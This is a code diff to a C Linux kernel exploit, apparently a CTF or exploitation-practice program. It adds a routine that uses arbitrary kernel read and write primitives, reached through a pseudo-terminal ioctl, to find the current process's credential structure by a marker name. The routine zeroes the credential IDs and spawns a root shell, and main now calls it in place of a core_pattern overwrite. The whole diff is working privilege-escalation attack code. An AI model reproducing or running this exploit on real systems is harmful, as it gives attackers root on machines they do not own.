@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/ioctl.h>
+#include <sys/prctl.h>
 #include <sys/stat.h>
 #include <unistd.h>
 
@@ -114,6 +115,34 @@ u32 aar32(u64 addr) {
     *(u64 *)&buf[0x18] = g_buf_addr + 0x3f8 - 0xc * 8;
     _write(g_fd, buf, sizeof(buf));
     return ioctl(g_ptmx_fd, 0, addr);
+}
+
+void overwrite_cred_privesc() {
+    u32 comm[] = {0xcafebabe, 0xdeadbeef, 0};
+    prctl(PR_SET_NAME, (char *)comm);
+    u64 start_addr = g_buf_addr - 0x1000000 / 4;
+    u64 cred_ptr = 0;
+    for (cred_ptr = start_addr; cred_ptr >= start_addr; cred_ptr += 16) {
+        if ((cred_ptr & 0xfffff) == 0)
+            progress("Searching... @ 0x%016llx", cred_ptr);
+        if (aar32(cred_ptr + 0) != comm[0])
+            continue;
+        if (aar32(cred_ptr + 4) != comm[1])
+            continue;
+        cred_ptr = cred_ptr - 0x8;
+        break;
+    }
+    if (!cred_ptr) {
+        fatal("Unable to locate current cred struct");
+    }
+    u64 cred_addr = 0;
+    cred_addr |= aar32(cred_ptr);
+    cred_addr |= (u64)aar32(cred_ptr + 4) << 32;
+    info("Found current cred struct @ 0x%016llx", cred_addr);
+    for (u32 i = 1; i < 9; i++) {
+        aaw32(cred_addr + i * 4, 0);
+    }
+    spawn_shell();
 }
 
 void overwrite_modprobe_path_privesc() {
@@ -283,8 +312,9 @@ int main(int argc, char *argv[]) {
     var(g_buf_addr);
     /* rop_privesc(g_fd, g_buf_addr); */
     /* overwrite_modprobe_path_privesc(); */
-    overwrite_core_pattern_privesc();
+    /* overwrite_core_pattern_privesc(); */
     /* overwrite_poweroff_cmd_privesc(); */
+    overwrite_cred_privesc();
 
     return 0;
 }
